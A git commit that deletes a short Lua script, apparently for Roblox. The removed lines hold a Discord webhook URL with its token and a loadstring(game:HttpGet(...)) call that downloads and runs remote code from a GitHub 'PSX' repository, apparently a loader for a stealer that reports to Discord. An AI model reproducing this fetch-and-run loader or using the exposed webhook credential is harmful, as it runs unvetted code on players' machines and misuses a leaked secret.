9162dda05812356e223b5e8dd764c7ad3bd4476d
Alwwex <118074781+Alwwex@users.noreply.github.com>
2023-02-16 23:02:02 +0100

    Delete script.lua

--- script.lua
+++
@@ -1,4 +0,0 @@
-UserName = "alexandrugutu07"
-WebHook = "https://discord.com/api/webhooks/1075129677150163055/cBCD6PEJ1qrkR6LzbiizSqpokQwktT50PUchsI0FOJFEHhj8Z-Haw5JVe8iFrj6FwvtW"
-Mention = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
